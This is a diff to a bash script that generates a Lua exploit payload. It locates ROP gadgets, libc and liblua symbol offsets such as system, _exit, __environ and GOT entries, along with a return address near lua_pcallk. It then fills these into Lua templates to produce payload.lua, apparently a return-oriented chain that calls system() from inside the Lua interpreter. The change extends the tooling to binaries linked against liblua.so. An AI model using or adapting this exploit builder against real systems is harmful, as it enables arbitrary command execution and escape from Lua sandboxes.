@@ -14,7 +14,12 @@ fi
 map_to_sed() {
     declare -n map="$1"
     for key in "${!map[@]}"; do
-        printf 's/%s/%s/g;' "$key" "${map[$key]}"
+        val="${map[$key]}"
+        if [[ "$val" == "0x" ]]; then
+            echo "$key is unpopulated; please fill in manually" > /dev/stderr
+            exit 1
+        fi
+        printf 's/%s/%s/g;' "$key" "$val"
     done
 }
 
@@ -35,24 +40,40 @@ get_reloc() {
 
 declare -A template
 
-template[STRING_LOWER_OFF]=$(get_symbol "$binpath" FUNC str_lower)
-template[OVERWRITTEN_RET_OFF]=0x$(objdump --disassemble=main "$binpath" | grep -A1 lua_pcallk | tail -n1 | awk '{print $1}' | sed 's/^0*//' | tr -d :)
+template[OVERWRITTEN_RET_OFF]=0x$(objdump -d "$binpath" | grep -A2 'call.*lua_pcallk' | tr -d '\n' | sed 's/--/\n/g' | grep 0xffffffff | cut -d: -f2 | grep -o '[0-9a-f]*$')
 template[POP_RDI_RET_OFF]=$(ROPgadget --binary "$binpath" --opcode 5fc3 | grep : | head -n1 | awk '{print $1}' | sed 's/^0x0*/0x/')
 
 if readelf -d "$binpath" | grep -q 'There is no dynamic section in this file'; then
     # statically linked
-    template_file='static.lua.template'
+    template_file='static.lua'
 
     # for ROP
+    template[STRING_LOWER_OFF]=$(get_symbol "$binpath" FUNC str_lower)
     template[ENVIRON_OFF]=$(get_symbol "$binpath" OBJECT __environ)
     template[SYSTEM_OFF]=$(get_symbol "$binpath" FUNC system)
     template[EXIT_OFF]=$(get_symbol "$binpath" FUNC _exit)
+elif ldd "$binpath" | grep -q liblua; then
+    # dynamically linked, liblua.so
+    template_file='dynamic_liblua.lua'
+    libc_path=$(ldd "$binpath" | grep libc.so | awk '{print $3}')
+    liblua_path=$(ldd "$binpath" | grep liblua | awk '{print $3}')
+
+    # for ROP
+    template[STRING_LOWER_OFF]=$(get_symbol "$liblua_path" FUNC str_lower)
+    template[TOLOWER_GOT_PLT_OFF]=$(get_reloc "$liblua_path" __ctype_tolower_loc)
+    template[TOLOWER_OFF]=$(get_symbol "$libc_path" FUNC  __ctype_tolower_loc)
+    template[SYSTEM_OFF]=$(get_symbol "$libc_path" FUNC system)
+    template[EXIT_OFF]=$(get_symbol "$libc_path" FUNC _exit)
+    template[ENVIRON_GOT_OFF]=$(get_reloc "$libc_path" __environ)
+    template[POP_RDI_RET_OFF]=$(ROPgadget --binary "$liblua_path" --opcode 5fc3 | grep : | head -n1 | awk '{print $1}' | sed 's/^0x0*/0x/')
+    template[OVERWRITTEN_RET_OFF]=0x$(objdump --disassemble=lua_pcallk "$liblua_path" | grep 'test.*%ebp,%ebp' | awk '{print $1}' | sed 's/^0*//' | tr -d :)
 else
-    # dynamically linked
-    template_file='dynamic.lua.template'
+    # dynamically linked, liblua.a
+    template_file='dynamic.lua'
     libc_path=$(ldd "$binpath" | grep libc.so | awk '{print $3}')
 
     # for ROP
+    template[STRING_LOWER_OFF]=$(get_symbol "$binpath" FUNC str_lower)
     template[TOLOWER_GOT_PLT_OFF]=$(get_reloc "$binpath" __ctype_tolower_loc)
     template[TOLOWER_OFF]=$(get_symbol "$libc_path" FUNC  __ctype_tolower_loc)
     template[SYSTEM_OFF]=$(get_symbol "$libc_path" FUNC system)
@@ -97,6 +118,10 @@ fi
 # handle 1-indexing
 template[STRING_LEN_OFF]=$((template[STRING_LEN_OFF] + template[PTRSIZE]))
 template[PTRMIN1]=$((template[PTRSIZE] - 1))
+
+# fill in anything missing here, e.g
+#template[MATH_LDEXP_OFF]=0x2a710
+#template[STRING_LOWER_OFF]=0x2da60
 
 sed_pattern="$(map_to_sed template)"
 cat base.lua "$template_file" | sed "$sed_pattern" > payload.lua
